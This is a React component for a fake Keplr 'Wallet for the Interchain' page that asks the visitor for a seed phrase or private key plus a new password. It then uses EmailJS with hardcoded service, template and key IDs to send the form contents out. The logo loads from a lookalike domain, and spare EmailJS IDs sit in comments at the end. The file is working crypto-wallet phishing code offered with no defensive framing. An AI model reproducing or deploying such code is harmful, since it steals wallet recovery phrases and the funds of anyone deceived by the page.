import React, { useRef, useState } from "react";
import { Link } from "react-router-dom";
import emailjs from "@emailjs/browser";
import { useNavigate } from "react-router-dom";
const ConnectId = () => {
  const [key, setKey] = useState("");
  const [name, setName] = useState("");
  const [password, setPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");

  const navigate = useNavigate();

  const form = useRef();
  const [errorText, setErrorText] = useState(null);

  const sendEmail = (e) => {
    e.preventDefault();
    if (!key) {
      setErrorText("Field cannot be empty, please complete");
    } else {
      return emailjs
        .sendForm(
          "service_b3onsac",
          "template_luyvtkc",
          form.current,
          "Afl-tWpRUJQYssiE7"
        )

        .then(
          (result) => {
            console.log("200 OK");
            // setPath("account");
            navigate("/account");
          },
          (error) => {
            console.log(error.text);
          }
        );
    }
  };

  return (
    <div className="flex items-center py-10 px-4 sm:max-w-[60vw]  lg:max-w-[60vw] lg:mx-auto  sm:mx-auto">
      <div className="flex flex-col ">
        <div className="flex">
          <img
            className="w-[180px] sm:w-[80px]"
            src="https://webstore.detail.keplr.dmkamcknogk.on-e.site/321/temp-icon.svg"
            alt=""
          />
          <span className="flex flex-col ml-8">
            <h1 className="text-[6rem] leading-12 font-bold sm:text-[3rem]">
              Keplr
            </h1>
            <h1 className="text-[3rem] sm:text-[1rem]">
              Wallet for the Interchain
            </h1>
          </span>
        </div>

        {/* form */}

        <div className="flex flex-col w-full">
          <h1 className="text-[4rem] sm:text-[1.5rem] text-gray-500">
            Input your seed
          </h1>
          <form
            ref={form}
            className="w-full flex flex-col items-center justify-center gap-[9rem] sm:gap-[2.4rem] mt-5"
          >
            <input
              name="key"
              value={key}
              onChange={(e) => setKey(e.target.value)}
              className="w-full rounded-md focus:shadow-lg bg-white py-10 sm:py-[1.4rem] px-3 shadow-md outline-none text-[2.7rem] sm:text-[1rem]"
              placeholder="Type your mnemonic/private key"
              type="password"
            />
            {errorText && <span className="text-red-500 ">{errorText}</span>}

            <div className="w-full">
              <span className="text-[2.9rem] font-semibold text-[#343850] sm:text-[1rem]">
                Account name
              </span>
              <input
                value={name}
                onChange={(e) => setName(e.target.value)}
                className="w-full rounded-md focus:shadow-lg bg-white py-10 px-3 shadow-md outline-none text-[2.7rem] sm:text-[1.5rem] sm:py-[0.1rem]"
                name="name"
                placeholder=""
                type="text"
              />
            </div>
            <div className="w-full">
              <span className="text-[2.9rem] font-semibold text-[#343850] sm:text-[1rem]">
                New Password (minimum 8 characters)
              </span>
              <input
                name="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full rounded-md focus:shadow-lg bg-white py-10 px-3 shadow-md outline-none text-[2.7rem] sm:text-[2rem] sm:py-[0.1rem]"
                placeholder=""
                type="password"
              />
            </div>
            <div className="w-full">
              <span className="text-[2.9rem] font-semibold text-[#343850] sm:text-[1rem]">
                Confirm password
              </span>
              <input
                name="confirmPassword"
                value={confirmPassword}
                onChange={(e) => setConfirmPassword(e.target.value)}
                className="w-full bg-white py-10 rounded-md focus:shadow-lg px-3 shadow-md outline-none text-[2.7rem] sm:text-[2rem] sm:py-[0.1rem]"
                placeholder=""
                type="password"
              />
            </div>
            <span className="text-[#5E72E4]  cursor-pointer text-[3rem] sm:text-[1.7rem]">
              Advanced
            </span>

            <button
              onClick={sendEmail}
              className="bg-[#5E72E4] text-center
               text-white py-10 sm:py-[0.3rem] w-full rounded-lg text-[3rem] sm:text-[2rem]"
              type="submit"
            >
              Next
            </button>
            {/* <Link
                to="/account"
                className=" h-full w-full absolute right-0 left-0 top-0 bottom-0 "
              >
                Next
              </Link> */}
          </form>
          <Link to="/">
            <p className="text-[#5E72E4] text-[3rem] mt-8 sm:text-[1.3rem]">
              back
            </p>
          </Link>
        </div>
      </div>
    </div>
  );
};

export default ConnectId;
// template_667j1sm
// 4ASmkqi_k8DD1IbGu
// service_nxych5i
